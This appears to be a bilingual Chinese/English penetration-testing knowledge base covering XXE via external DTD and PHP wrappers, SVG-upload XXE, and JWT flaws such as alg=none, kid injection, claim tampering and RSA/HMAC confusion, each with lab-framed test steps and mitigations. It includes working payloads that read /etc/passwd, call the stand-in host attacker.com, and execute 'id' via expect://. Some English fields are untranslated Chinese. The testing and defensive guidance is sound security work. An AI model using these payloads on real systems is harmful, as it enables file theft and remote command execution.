exploitation.en: 1. 提交不含外部资源的内部参数实体，确认 DTD 和 `%name;` 是否被解析；2. 在隔离环境运行现有参数实体样例并记录实体声明、输出和解析日志；3. 使用禁用 DTD、未声明实体和不存在资源作为对照。观察证据是参数实体展开后的唯一标记进入文档结果；单纯“实体未定义”或 XML 格式错误属于假阳性。

mitigation.zh: 1. 在解析器工厂层禁用 DOCTYPE、外部通用实体和外部参数实体；2. 提供拒绝所有外部标识符的 EntityResolver；3. 不对不可信 XML 启用 DTD 验证，限制输入大小和实体展开量；4. 对 DOCTYPE、ENTITY 和异常展开建立日志、告警及单元回归。
mitigation.en: 1. Disable DOCTYPE declarations, external general entities, and external parameter entities at the parser-factory layer. 2. Provide an Entity Resolver that rejects every external identifier. 3. Do not enable DTD validation for untrusted XML and limit input size and entity expansion. 4. Log and alert on DOCTYPE, ENTITY, and abnormal expansion and add unit regression cases.

name.zh: XXE 特殊字符编码与外部 DTD 组合
name.en: XXE Special-Character Encoding with an External DTD

description.zh: 验证外部 DTD 与编码包装能否让包含 XML 特殊字符的受控内容进入解析结果，重点核对解析器和运行时支持。
description.en: Verifies whether an external DTD and encoding wrapper can carry controlled content containing XML metacharacters into parser output, with processor and runtime support explicitly checked.

prerequisites.zh: 目标 parser 支持外部参数实体，外部 DTD 能定义包装实体，运行时还明确支持待测 php://filter 等 scheme；否则应替换为普通 marker。
prerequisites.en: The target parser supports external parameter entities, an external DTD can define wrapper entities, and the runtime explicitly supports a tested scheme such as php://filter; otherwise a plain marker is substituted.

prerequisites.zh: 使用自有 DTD 和只含 XML 特殊字符的无敏感 marker，记录 DTD 请求、scheme resolver、实体展开结果与完整编码字节。
prerequisites.en: An owned DTD and nonsensitive marker containing XML special characters record DTD requests, scheme resolver behavior, entity-expansion results, and exact encoded bytes.

title.zh: XXE CDATA绕过(提取含特殊字符的文件)
title.en: Validation step 1 for XXE Special-Character Encoding with an External DTD

description.zh: XXE CDATA绕过(提取含特殊字符的文件)包含多个可复现输入样例；应逐条测试并记录响应与日志差异。
description.en: Run this XXE Special-Character Encoding with an External DTD validation command in an authorized lab, preserve the output, and compare it with the documented baseline.

analysis.zh: 阳性证据是 parser 获取自有 DTD、读取 marker，经包装/编码后将包含特殊字符的值安全组合到解析结果，三个解析阶段均可证明。 假阳性边界：php:// 字符串存在、运行时不支持该 scheme、仅 DTD 回调、Base64 文本由客户端生成、解析错误含路径或实体值被拒绝均不能证明内容读取。
analysis.en: Positive evidence requires the parser to fetch the owned DTD, read the marker, and place its wrapped or encoded special-character value into the parse result, proving all three resolution stages. False-positive boundary: A php:// string, unsupported runtime scheme, DTD callback alone, client-generated Base64, paths in parser errors, or rejected entity values does not prove content reading.

opsecTips.zh: CDATA/编码 XXE 只使用短特殊字符 marker，不读取真实文件或把内容外带；出现数据量增长、公共请求、递归实体、敏感输出或 parser 异常时停止。
opsecTips.en: CDATA and encoding XXE uses a short special-character marker only and never reads or exfiltrates real files; stop on data growth, public requests, recursive entities, sensitive output, or parser anomalies.

opsecTips.zh: 删除 XML、外部 DTD、marker 与编码产物，关闭 resolver 端点，清理 parser 缓存/错误日志并恢复 scheme/实体限制。
opsecTips.en: Delete XML, external DTDs, markers, and encoded artifacts, close resolver endpoints, clear parser caches and error logs, and restore scheme and entity restrictions.

title.zh: 验证运行时 URI 支持

description.zh: 在隔离环境确认解析器是否识别样例中的编码 wrapper，并准备只含随机标记的文件。
description.en: In isolation, confirm whether the parser recognizes the encoding wrapper and prepare a file containing only a random marker.

title.zh: 运行编码实体组合

description.zh: 提交现有外部 DTD 与编码输入，收集 DTD 请求、resolver 日志、解析输出和任务标识。
description.en: Submit the existing external-DTD and encoding input and collect DTD requests, resolver logs, parser output, and the job identifier.

attackChain.payload:
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % dtd SYSTEM "http://attacker.com/cdata.dtd">
<data>&all;</data>

title.zh: 解码并核对唯一标记
title.en: Decode and match the unique marker

description.zh: 只有解析输出可解码为预置标记且访问日志一致才确认，排除随机 base64 和普通错误。
description.en: Confirm only when parser output decodes to the prepositioned marker and access logs agree, excluding random base64 and ordinary errors.

title.zh: 限制 URI scheme 后回归

description.zh: 关闭外部实体并拒绝非业务 scheme 后重放样例，确认正常 XML 可处理而 wrapper 不再解析。
description.en: Disable external entities, reject nonbusiness schemes, and replay the sample to confirm normal XML works while the wrapper no longer resolves.

overview.zh: 普通实体内容含有 `<`、`&` 等字符时可能破坏 XML 结构，因此某些测试通过外部 DTD、CDATA 包装或运行时编码流先转换内容。当前样例使用 PHP stream wrapper，只有底层解析环境支持该 URI scheme 时才适用，不能当作所有 XML 解析器的通用能力。
overview.en: Entity content containing `<`, `&`, or related characters can break XML structure, so some tests combine an external DTD, CDATA wrapping, or an encoding stream. The current sample uses a PHP stream wrapper and applies only when the underlying environment supports that URI scheme; it is not universal XML parser behavior.

vulnerability.zh: 根因仍是外部实体和外部 DTD 可用，同时 resolver 接受超出业务需要的 URI scheme。编码成功、外部 DTD 加载和实体回显是三个独立条件；看到 base64 字符串或解析错误不能单独证明读取了目标资源，必须用预置无害标记验证。
vulnerability.en: The root cause remains enabled external entities and DTDs combined with a resolver accepting URI schemes beyond business need. Encoding, external-DTD loading, and entity reflection are separate conditions. A base64-looking string or parse error alone does not prove resource access; use a prepositioned harmless marker.

exploitation.zh: 1. 在隔离容器创建只含随机标记的测试文件并确认运行时是否支持所用 URI scheme；2. 提交现有外部 DTD/编码样例，记录 DTD 请求、解析输出和解码结果；3. 用不存在文件、禁用 wrapper 和普通文本对照。观察证据是输出可解码为预置标记且任务日志存在对应访问；任意 base64、错误堆栈或 DTD 请求本身属于假阳性。
exploitation.en: 1. Create a test file containing only a random marker in an isolated container and confirm whether the runtime supports the URI scheme. 2. Submit the existing external-DTD and encoding sample and record DTD requests, parser output, and decoded result. 3. Compare a missing file, disabled wrapper, and plain text. Evidence is output that decodes to the marker plus correlated job access; arbitrary base64, stack traces, or a DTD request alone are false positives.

mitigation.zh: 1. 禁用外部 DTD、通用实体和参数实体；2. 将 resolver 限制为无外部 URI，显式拒绝 file、php、jar 等非业务 scheme；3. 在低权限、无网络容器解析并限制可见文件；4. 对 URI scheme、外部 DTD 请求和异常编码结果建立审计与回归测试。
mitigation.en: 1. Disable external DTDs, general entities, and parameter entities. 2. Restrict the resolver to no external URIs and explicitly reject nonbusiness schemes such as file, php, and jar. 3. Parse in a low-privilege, no-network container with a minimal file view. 4. Audit URI schemes, external-DTD requests, and unusual encoded output and add regression tests.

title.zh: 关闭外部解析并回归

description.zh: 修复后普通 SVG 仍可栅格化，该机制在访问 marker 前失败。
description.en: After remediation ordinary SVG still rasterizes and this mechanism fails before marker access.

overview.zh: 该条专门覆盖“上传接口本身正常，但后续图片任务解析 SVG”这一链路。常见触发点是读取宽高、生成头像缩略图、压缩、OCR 或格式转换；异步执行意味着响应时间和真正解析时间可能分离，需要使用任务 ID 和日志关联。
overview.en: This entry specifically covers cases where the upload endpoint succeeds but a later image job parses the SVG. Common triggers include dimension reading, avatar thumbnailing, compression, OCR, or format conversion. Asynchronous execution separates response time from parsing time, so job IDs and logs are required.

vulnerability.zh: 根因是后续图片处理器使用通用 XML 解析配置并继承文件、网络权限，而上传层只验证扩展名或 MIME。前端能查看原始 SVG 不代表后端展开实体；反之，异步任务失败也可能只是格式不兼容，必须取得解析器级证据。
vulnerability.en: The root cause is a downstream image processor using general XML defaults with file or network privileges while the upload layer validates only extension or MIME. Viewing the raw SVG in a browser does not prove backend entity expansion, and an asynchronous job failure may be simple incompatibility, so parser-level evidence is required.

exploitation.zh: 1. 上传合法 SVG 并记录正常缩略图、任务状态和处理时长；2. 提交现有实体 SVG，主动触发头像裁剪、预览或转码并收集任务日志；3. 用无 DOCTYPE 和不存在资源的 SVG 对照。观察证据是受控标记进入缩略图文本/元数据或出现相关实体访问；仅任务失败、占位图或延迟属于假阳性。
exploitation.en: 1. Upload a valid SVG and record normal thumbnail output, job status, and processing time. 2. Submit the existing entity SVG, trigger avatar crop, preview, or conversion, and collect job logs. 3. Compare with no-DOCTYPE and missing-resource SVG controls. Evidence is a controlled marker in thumbnail text or metadata or correlated entity access; job failure, placeholder images, and delay alone are false positives.

mitigation.zh: 1. 上传后立即对 SVG 进行安全解析或转为位图，后续只消费净化产物；2. 为所有图片库禁用外部实体和远程资源；3. 让任务容器无出站网络、无宿主敏感文件访问且设置时间/内存限制；4. 对异步任务记录来源文件哈希、解析异常和网络事件并持续回归。
mitigation.en: 1. Safely parse or rasterize SVG immediately after upload so downstream systems consume only sanitized output. 2. Disable external entities and remote resources in every image library. 3. Give job containers no egress or host-sensitive file access and enforce time and memory limits. 4. Record source hashes, parser exceptions, and network events for asynchronous jobs and maintain regression coverage.

description.en: Submit only this execution variant and replace real destinations with isolated markers.

attackChain.payload: <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg"><text font-size="16" x="0" y="16">&xxe;</text></svg>

title.zh: 关联 Worker 与派生产物
title.en: Correlate the worker and derived artifact

description.zh: 匹配任务 token、解析器事件和缩略图或文本结果，排除客户端解析。
description.en: Match job token, parser events, and thumbnail or text output and exclude client parsing.

title.zh: 关闭外部解析并回归

description.zh: 修复后普通 SVG 仍可栅格化，该机制在访问 marker 前失败。
description.en: After remediation ordinary SVG still rasterizes and this mechanism fails before marker access.

overview.zh: 该条专门覆盖“上传接口本身正常，但后续图片任务解析 SVG”这一链路。常见触发点是读取宽高、生成头像缩略图、压缩、OCR 或格式转换；异步执行意味着响应时间和真正解析时间可能分离，需要使用任务 ID 和日志关联。
overview.en: This entry specifically covers cases where the upload endpoint succeeds but a later image job parses the SVG. Common triggers include dimension reading, avatar thumbnailing, compression, OCR, or format conversion. Asynchronous execution separates response time from parsing time, so job IDs and logs are required.

vulnerability.zh: 根因是后续图片处理器使用通用 XML 解析配置并继承文件、网络权限，而上传层只验证扩展名或 MIME。前端能查看原始 SVG 不代表后端展开实体；反之，异步任务失败也可能只是格式不兼容，必须取得解析器级证据。
vulnerability.en: The root cause is a downstream image processor using general XML defaults with file or network privileges while the upload layer validates only extension or MIME. Viewing the raw SVG in a browser does not prove backend entity expansion, and an asynchronous job failure may be simple incompatibility, so parser-level evidence is required.

exploitation.zh: 1. 上传合法 SVG 并记录正常缩略图、任务状态和处理时长；2. 提交现有实体 SVG，主动触发头像裁剪、预览或转码并收集任务日志；3. 用无 DOCTYPE 和不存在资源的 SVG 对照。观察证据是受控标记进入缩略图文本/元数据或出现相关实体访问；仅任务失败、占位图或延迟属于假阳性。
exploitation.en: 1. Upload a valid SVG and record normal thumbnail output, job status, and processing time. 2. Submit the existing entity SVG, trigger avatar crop, preview, or conversion, and collect job logs. 3. Compare with no-DOCTYPE and missing-resource SVG controls. Evidence is a controlled marker in thumbnail text or metadata or correlated entity access; job failure, placeholder images, and delay alone are false positives.

mitigation.zh: 1. 上传后立即对 SVG 进行安全解析或转为位图，后续只消费净化产物；2. 为所有图片库禁用外部实体和远程资源；3. 让任务容器无出站网络、无宿主敏感文件访问且设置时间/内存限制；4. 对异步任务记录来源文件哈希、解析异常和网络事件并持续回归。
mitigation.en: 1. Safely parse or rasterize SVG immediately after upload so downstream systems consume only sanitized output. 2. Disable external entities and remote resources in every image library. 3. Give job containers no egress or host-sensitive file access and enforce time and memory limits. 4. Record source hashes, parser exceptions, and network events for asynchronous jobs and maintain regression coverage.

name.zh: SVG PHP Expect 实体执行边界

description.zh: 隔离 expect:// 实体，验证 PHP expect 扩展是否意外暴露给 SVG XML resolver。
description.en: Isolates an expect:// entity to test whether the PHP expect extension is accidentally exposed to the SVG XML resolver.

prerequisites.zh: 上传后的 SVG 会由服务端尺寸读取、预览或栅格化 worker 解析 XML，而不是仅静态存储或客户端浏览。
prerequisites.en: 上传后的 SVG 会由服务端尺寸读取、预览或栅格化 worker 解析 XML，而不是仅静态存储或客户端浏览。

prerequisites.zh: 测试 SVG 的实体只引用 worker 沙箱内固定 marker，异步任务保存上传 ID、worker PID、文件审计和生成图像/OCR 文本。
prerequisites.en: The test SVG entity references only a fixed marker inside the worker sandbox, with upload identifier, worker PID, file audit, and generated image or OCR text preserved for the asynchronous job.

title.zh: SVG PHP Expect 实体执行边界

execution.command: <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "expect://id">]><svg xmlns="http://www.w3.org/2000/svg"><text font-size="16" x="0" y="16">&xxe;</text></svg>

description.zh: 绝不运行原始 id；只用无子进程测试 wrapper 返回当前任务 marker。
description.en: Never run the source id command; use only a no-child-process test wrapper that returns the current job marker.

analysis.zh: 阳性要求无副作用测试 wrapper 在处理该 SVG 的 PHP worker 内被调用；命令文本、解析错误或 scheme 被识别不能证明执行。
analysis.en: A positive requires the side-effect-free test wrapper to be invoked in the PHP worker processing this SVG; command text, parse errors, or scheme recognition does not prove execution.

opsecTips.zh: SVG 上传 XXE 只读 worker 沙箱 marker；出现主机真实文件访问、外连、处理队列积压、图像炸弹行为或 worker 重启时停止。
opsecTips.en: SVG upload XXE reads only a worker-sandbox marker; stop on real host-file access, egress, processing backlog, image-bomb behavior, or worker restarts.

opsecTips.zh: 删除上传 SVG、marker、临时解包/栅格文件和预览，清理对象存储/任务队列/图像缓存并重启 worker。
opsecTips.en: Delete uploaded SVGs, markers, temporary extraction or raster files, and previews, clear object storage, job queues, and image caches, and restart workers.

description.en: Record the upload job, worker, version, and no-external-resource baseline.

description.zh: 验证 JWT 验证器是否严格拒绝 alg=none 及其大小写变体，并确保空签名令牌不能进入授权逻辑。
description.en: Verifies that a JWT validator rejects alg=none and case variants and never lets an unsigned token reach authorization logic.

prerequisites.zh: 使用测试签发方、受众和低权限账户生成一枚有效签名基线 JWT，并固定资源服务器的算法白名单。
prerequisites.en: Generate a valid signed baseline JWT from a test issuer, audience, and low-privilege account, and pin the resource server's algorithm allowlist.

prerequisites.zh: 仅把 Header 的 alg 改为 none 及大小写变体，保留相同无敏感 claims，并采集解析、签名和授权三阶段日志。
prerequisites.en: Change only the header alg to none and case variants while retaining the same nonsensitive claims, and collect parser, signature, and authorization-stage logs.

title.zh: JWT none算法绕过
title.en: Validation step 1 for JWT none Algorithm Rejection Test

description.en: Run this JWT none Algorithm Rejection Test validation command in an authorized lab, preserve the output, and compare it with the documented baseline.

analysis.zh: 阳性是无签名 token 越过签名校验并以测试主体访问了需要认证的固定资源，日志明确显示 alg=none 被接受。仅解析成功、错误信息变化、token 内容被 UI 解码、返回匿名 200、或网关转发后资源服务器拒绝都不是 none 算法漏洞。
analysis.en: Positive evidence is an unsigned token passing signature validation and accessing a fixed authenticated resource as the test principal, with logs explicitly showing alg=none acceptance. Successful parsing, changed error text, client-side token decoding, anonymous HTTP 200, or gateway forwarding followed by resource-server rejection is not a none-algorithm vulnerability.

opsecTips.zh: 一个无签名 token 首次通过固定只读资源后停止，不添加管理员 claims 或调用写接口。
opsecTips.en: Stop after one unsigned token reaches the fixed read-only resource; do not add administrator claims or invoke write endpoints.

opsecTips.zh: 撤销测试 token 与会话，清除认证缓存和解析日志，并恢复服务端算法固定及签名必需配置。
opsecTips.en: 撤销测试 token 与会话，清除认证缓存和解析日志，并恢复服务端算法固定及签名必需配置。

title.zh: 记录签名令牌基线

description.zh: 用低权限测试账号确认有效签名令牌可访问的最小资源范围。
description.en: Confirm the minimum resource scope available to a valid signed token for a low-privilege test account.

title.zh: 提交 none 变体

description.zh: 发送原始未签名令牌集合并记录验证器错误、主体解析和响应摘要。
description.en: Send the original unsigned-token set and record validator errors, resolved principal, and response digest.

title.zh: 证明签名被绕过

description.zh: 仅在修改后的未签名声明影响真实授权结果时确认，并关联服务端日志。
description.en: Confirm only when modified unsigned claims affect a real authorization result and correlate that result with server logs.

overview.zh: none 算法测试用于确认服务端是否把 JWT Header 中的 alg 当作可信配置；安全实现必须从服务端策略选择算法并拒绝所有未签名令牌
overview.en: The none-algorithm test checks whether the server trusts the JWT alg header as configuration; a secure implementation selects algorithms from server policy and rejects every unsigned token

vulnerability.zh: 受影响实现会接受 alg=none、忽略签名段或在算法解析大小写异常时走到无签名分支，使攻击者可以修改 claims 后伪造身份
vulnerability.en: A vulnerable implementation accepts alg=none, ignores the signature segment, or reaches an unsigned path through case-handling errors, allowing modified claims to impersonate another identity

exploitation.zh: 1. 获取测试账号的有效签名令牌并记录受保护接口基线；2. 保持 payload claims 不变，依次提交原始 none 大小写变体和空签名格式；3. 再修改一个无害声明并核对服务端主体与授权日志。只有未签名令牌获得受保护数据才确认漏洞；统一 200 错误包装或公开接口响应属于假阳性。
exploitation.en: 1. 获取测试账号的有效签名令牌并记录受保护接口基线；2. 保持 payload claims 不变，依次提交原始 none 大小写变体和空签名格式；3. 再修改一个无害声明并核对服务端主体与授权日志。只有未签名令牌获得受保护数据才确认漏洞；统一 200 错误包装或公开接口响应属于假阳性。

mitigation.zh: 1. 在服务端固定允许算法列表并显式拒绝 none；2. 使用维护中的 JWT 库，验证签名后再读取授权声明；3. 为算法大小写、空签名和畸形段建立负向测试及认证失败告警。
mitigation.en: 1. Pin an allowlist of algorithms on the server and explicitly reject none. 2. Use a maintained JWT library and verify the signature before consuming authorization claims. 3. Add negative tests for algorithm case, empty signatures, and malformed segments and alert on validation failures.

name.zh: JWT kid 密钥选择注入

description.zh: 验证服务端是否将 kid 直接用于文件路径、数据库查询或远程密钥选择，从而允许攻击者控制验证密钥。
description.en: Tests whether the server uses kid directly in file paths, database queries, or remote key selection and thereby lets an attacker influence the verification key.

prerequisites.zh: 建立只包含两个注册 key ID 的测试 JWKS/密钥库，并记录 kid 到本地文件、数据库或远程键的实际映射路径。
prerequisites.en: Create a test JWKS or keystore with only two registered key IDs and record the actual mapping from kid to local file, database, or remote key.

prerequisites.zh: 为路径穿越、特殊值和未知 ID 使用无效签名与合法签名配对，开启文件访问、查询参数和密钥选择审计。
prerequisites.en: Pair invalid and valid signatures for traversal, special-value, and unknown-ID cases, enabling file-access, query-parameter, and key-selection auditing.

title.zh: JWT kid注入
title.en: Validation step 1 for JWT kid Key-Selection Injection

description.zh: JWT kid注入包含多个可复现输入样例；应逐条测试并记录响应与日志差异。
description.en: Run this JWT kid Key-Selection Injection validation command in an authorized lab, preserve the output, and compare it with the documented baseline.

analysis.zh: 阳性要求攻击者控制的 kid 改变了验证密钥来源，并使原本无效的测试签名通过，文件/数据库/JWKS 审计能够证明选择链。仅出现文件不存在、SQL 错误、未知 key、HTTP 获取失败、kid 被记录或 token 被解析都不构成密钥选择注入。
analysis.en: Positive evidence requires an attacker-controlled kid to alter the verification-key source and make an otherwise invalid test signature pass, with file, database, or JWKS auditing proving the selection chain. File-not-found, SQL errors, unknown-key responses, failed HTTP fetches, logged kid values, or token parsing alone do not establish key-selection injection.

opsecTips.zh: 一个注册测试密钥被越界选中后停止，不读取系统文件、查询真实密钥表或访问外部 JWKS。
opsecTips.en: Stop after one registered test key is selected outside its intended mapping; do not read system files, query real key tables, or access external JWKS endpoints.

opsecTips.zh: 删除临时密钥和 JWKS，清除密钥缓存及访问审计，并恢复 kid 精确映射、路径隔离和查询参数化。
opsecTips.en: Delete temporary keys and JWKS data, clear key caches and access audits, and restore exact kid mapping, path isolation, and parameterized lookup.

title.zh: 建立合法 kid 对照

description.zh: 用预注册的两个密钥标识符确认正常选择与轮换行为。
description.en: Confirm normal selection and rotation behavior with two registered key identifiers.

title.zh: 探测密钥查找边界

description.zh: 提交原始 kid 变体并捕获密钥查找、文件访问或查询日志。
description.en: Submit the original kid variants and capture key lookup, file access, or query logs.

title.zh: 验证密钥控制

description.zh: 只有攻击者选择的密钥成功验证篡改令牌时才确认，错误信息差异不够。
description.en: Confirm only if an attacker-selected key validates a modified token; error-message differences are insufficient.

overview.zh: kid 是 JWT Header 中的密钥标识符，本应只映射到服务端预注册密钥；该测试覆盖目录穿越、特殊值和密钥查找边界，而不是把任意字符串视为有效密钥
overview.en: The JWT kid header should map only to a server-registered key; this test covers traversal, special values, and key-lookup boundaries rather than treating arbitrary strings as valid keys

vulnerability.zh: 如果应用把 kid 拼接到文件路径、SQL 或缓存键中，攻击者可选择可预测内容作为 HMAC 密钥，或触发密钥查询注入和越界读取
vulnerability.en: If an application concatenates kid into a file path, SQL query, or cache key, an attacker may select predictable content as an HMAC key or trigger injection and out-of-bounds key reads

exploitation.zh: 1. 使用两个合法 kid 的测试令牌确认服务端密钥轮换基线；2. 提交原始目录穿越和异常 kid 变体，同时保持算法与 claims 不变；3. 观察密钥查找日志、错误类型及授权结果，并用不存在 kid 对照。文件不存在、统一签名失败或仅错误差异不能证明密钥被控制。
exploitation.en: 1. Use test tokens with two legitimate kid values to establish key-rotation behavior. 2. Submit the original traversal and malformed kid variants while keeping algorithm and claims unchanged. 3. Inspect key-lookup logs, error types, and authorization results, with a nonexistent kid as control. Missing-file errors, uniform signature failures, or error differences alone do not prove key control.

mitigation.zh: 1. 将 kid 与固定密钥表做精确映射，不参与路径或查询拼接；2. 限制字符集、长度并拒绝未知 kid；3. 对密钥加载实施最小文件权限、参数化查询和审计，并添加目录穿越负向测试。
mitigation.en: 1. 将 kid 与固定密钥表做精确映射，不参与路径或查询拼接；2. 限制字符集、长度并拒绝未知 kid；3. 对密钥加载实施最小文件权限、参数化查询和审计，并添加目录穿越负向测试。

name.zh: JWT 未签名权限声明篡改

description.zh: 验证修改 role、is_admin、permissions 等声明后，服务端是否在缺少有效签名的情况下信任这些权限字段。
description.en: Tests whether the server trusts modified role, is_admin, or permissions claims when the token lacks a valid signature.

prerequisites.zh: 为低权限合成用户签发有效 JWT，并准备一个只读管理员 canary 端点以区分 claims 展示与服务端授权。
prerequisites.en: 为低权限合成用户签发有效 JWT，并准备一个只读管理员 canary 端点以区分 claims 展示与服务端授权。

prerequisites.zh: 只修改 role、is_admin 或 permissions claim 并移除/破坏签名，记录签名验证结果、最终主体和授权决策。
prerequisites.en: Modify only role, is_admin, or permissions claims while removing or corrupting the signature, recording signature results, final principal, and authorization decision.

title.zh: JWT空签名 (修改role/admin)
title.en: Validation step 1 for Unsigned JWT Privilege-Claim Tampering

description.zh: JWT空签名 (修改role/admin)包含多个可复现输入样例；应逐条测试并记录响应与日志差异。
description.en: Run this Unsigned JWT Privilege-Claim Tampering validation command in an authorized lab, preserve the output, and compare it with the documented baseline.

analysis.zh: 阳性是被篡改且无有效签名的权限 claim 被服务器信任，使低权限主体读取管理员 canary，审计显示授权直接采用该 claim。前端菜单变为管理员、Base64URL 解码显示 admin、返回 401/403、仅登录成功或原账户本就有权限都属于假阳性。
analysis.en: Positive evidence is a tampered privilege claim without a valid signature being trusted by the server so the low-privilege principal can read the administrator canary, with auditing showing authorization derived from that claim. An administrator menu in the client, Base64URL decoding that displays admin, HTTP 401 or 403, ordinary login success, or an account already entitled to the resource is a false positive.

opsecTips.zh: 管理员 canary 首次被无效签名 token 读取后停止，不尝试修改角色、账户或业务数据。
opsecTips.en: Stop after the administrator canary is first read with an invalidly signed token; do not modify roles, accounts, or business data.

opsecTips.zh: 撤销合成账户和全部测试 JWT，清除 claims/授权缓存与审计标记，并恢复签名先于授权的校验顺序。
opsecTips.en: Revoke the synthetic account and all test JWTs, clear claim and authorization caches and audit markers, and restore signature validation before authorization.

title.zh: 建立低权限基线

description.zh: 使用原始低权限令牌请求管理员接口，确认服务端拒绝受保护操作并记录响应基线。
description.en: 使用原始低权限令牌请求管理员接口，确认服务端拒绝受保护操作并记录响应基线。

title.zh: 修改单个权限声明

description.zh: 使用原始令牌变体依次更改 role、is_admin 或 permissions，保持其他字段不变。
description.en: Use the original token variants to change role, is_admin, or permissions one at a time while preserving other fields.

title.zh: 在服务端确认授权

description.zh: 通过受保护资源和审计日志验证是否真实提权，忽略仅客户端显示变化。
description.en: Use the protected resource and audit log to verify actual escalation, ignoring client-only display changes.

overview.zh: JWT claims 只是被签名保护的数据，并不因为 Base64URL 编码而可信；该条聚焦权限声明篡改与签名验证顺序，而不是声明名称本身
overview.en: JWT claims are data protected by a signature and are not trusted merely because they are Base64URL encoded; this entry focuses on privilege-claim tampering and validation order

vulnerability.zh: 服务端若先依据 role 或 is_admin 做授权，再验证签名，或把空签名与解析成功混为一谈，就会允许客户端自授予管理员权限
vulnerability.en: If the server authorizes on role or is_admin before verifying the signature, or conflates successful parsing with successful validation, a client can grant itself administrative privileges

exploitation.zh: 1. 用低权限账号令牌访问管理员接口并记录拒绝基线；2. 提交原始 role/admin 声明变体但保留空签名，逐次只改变一个声明；3. 核对服务端主体、权限计算和审计事件。只有受保护操作被允许才算成功；前端菜单变化、解码页面显示 admin 或公开接口 200 都是假阳性。
exploitation.en: 1. Access an administrative endpoint with a low-privilege token and record the denied baseline. 2. Submit the original role and admin claim variants with an empty signature, changing one claim at a time. 3. Verify the server principal, permission calculation, and audit event. Only an allowed protected operation confirms the flaw; UI menu changes, a decoder showing admin, or a public 200 response are false positives.

mitigation.zh: 1. 在任何 claims 使用前完成签名、算法、issuer、audience 与时效验证；2. 高价值权限从服务端数据库读取，不直接信任客户端 role；3. 对声明篡改、空签名和权限提升建立自动化负向测试。
mitigation.en: 1. 在任何 claims 使用前完成签名、算法、issuer、audience 与时效验证；2. 高价值权限从服务端数据库读取，不直接信任客户端 role；3. 对声明篡改、空签名和权限提升建立自动化负向测试。

name.zh: JWT RSA/HMAC 算法混淆

description.zh: 验证使用非对称算法的服务是否错误接受 HMAC 令牌，并把公开 RSA 公钥当作共享密钥。
description.en: Tests whether a service intended to use asymmetric signatures mistakenly accepts HMAC tokens and treats an RSA public key as a shared secret.

prerequisites.zh: 确认服务设计只接受 RS/ES 等非对称算法，并使用专用测试 RSA 公私钥与低权限 claims。
prerequisites.en: Confirm that the service is designed to accept only an asymmetric algorithm such as RS or ES, using a dedicated test RSA key pair and low-privilege claims.

prerequisites.zh: 以公开测试公钥字节作为 HMAC secret 生成对照 token，同时固定 issuer、audience、kid 与资源端算法配置。
prerequisites.en: Generate the comparison token using the public test-key bytes as an HMAC secret while fixing issuer, audience, kid, and resource-server algorithm configuration.

title.zh: JWT RSA-HMAC混淆
title.en: Validation step 1 for JWT RSA/HMAC Algorithm Confusion

description.zh: JWT RSA-HMAC混淆包含多个可复现输入样例；应逐条测试并记录响应与日志差异。
description.en: Run this JWT RSA/HMAC Algorithm Confusion validation command in an authorized lab, preserve the output, and compare it with the documented baseline.

analysis.zh: 阳性要求预期仅验证 RSA 的服务接受以公钥作为 HMAC secret 签出的 token，并让合成主体通过受保护只读端点，验证日志显示从客户端 alg 选择了 HMAC 分支。算法不支持、签名失败、公开密钥可下载、token 可解析或使用真正共享密钥的合法 HS256 服务均是假阳性。
analysis.en: Positive evidence requires a service intended to verify only RSA to accept a token HMAC-signed with the public-key bytes and authorize the synthetic principal at a protected read-only endpoint, with validation logs showing the client alg selected the HMAC branch. Unsupported algorithms, signature failure, a downloadable public key, token parsing, or a legitimate HS256 service using a real shared secret are false positives.

opsecTips.zh: 一个混淆 token 通过只读 canary 后停止，不提升 claims 或针对其他租户、kid 和真实公钥重放。
opsecTips.en: Stop after one confused token passes the read-only canary; do not elevate claims or replay against other tenants, key IDs, or production public keys.

opsecTips.zh: 轮换并删除测试密钥，撤销 token，清除 JWKS/验证缓存和诊断日志，并恢复算法与密钥类型严格绑定。
opsecTips.en: Rotate and delete test keys, revoke tokens, clear JWKS and validation caches and diagnostic logs, and restore strict binding between algorithm and key type.

title.zh: 确认非对称基线

description.zh: 记录有效 RS256 令牌、公开公钥指纹与服务端算法配置。
description.en: Record a valid RS256 token, the public-key fingerprint, and server algorithm configuration.

title.zh: 构造 HMAC 对照

description.zh: 提交原始算法变体，使用公开测试材料生成可比较的 HS256 令牌。
description.en: Submit the original algorithm variants and use public test material to create a comparable HS256 token.

title.zh: 核对验证分支

description.zh: 从验证日志和受保护响应证明服务端是否错误进入 HMAC 分支。
description.en: Use validation logs and a protected response to prove whether the server incorrectly entered the HMAC branch.

overview.zh: RSA/HMAC 混淆发生在验证器根据客户端 alg 选择验证分支，却向不同算法复用同一 key 参数；公开公钥因此可能被误作 HMAC 密钥
overview.en: RSA/HMAC confusion occurs when a verifier chooses its branch from the client-controlled alg header while reusing one key parameter across algorithms, allowing a public key to be misused as an HMAC secret

vulnerability.zh: 受影响代码未固定预期算法，也未区分非对称公钥与对称密钥类型，使攻击者可把 RS256 令牌改成 HS256 并用公开材料重新签名
vulnerability.en: Vulnerable code fails to pin the expected algorithm or distinguish asymmetric public keys from symmetric secrets, letting an attacker change RS256 to HS256 and sign with public material

exploitation.zh: 1. 取得测试环境的合法 RS256 令牌与对应公开公钥，确认 RS256 基线；2. 使用原始 RSA/HMAC 变体构造 HS256 对照并保持 claims 不变；3. 再改变一个低风险声明，核对验证库日志与授权结果。仅算法名称出现在错误信息中不是漏洞，必须证明 HMAC 令牌被接受并影响受保护资源。
exploitation.en: 1. 取得测试环境的合法 RS256 令牌与对应公开公钥，确认 RS256 基线；2. 使用原始 RSA/HMAC 变体构造 HS256 对照并保持 claims 不变；3. 再改变一个低风险声明，核对验证库日志与授权结果。仅算法名称出现在错误信息中不是漏洞，必须证明 HMAC 令牌被接受并影响受保护资源。

mitigation.zh: 1. 在验证调用中固定 RS256/ES256 等预期算法；2. 为对称和非对称密钥使用不同类型与存储，禁止跨算法复用；3. 升级 JWT 库并添加 RS→HS、未知算法和错误密钥类型测试。
mitigation.en: 1. Pin the expected RS256, ES256, or other algorithm in the verification call. 2. Use distinct types and stores for symmetric and asymmetric keys and forbid cross-algorithm reuse. 3. Upgrade the JWT library and test RS-to-HS changes, unknown algorithms, and wrong key types.

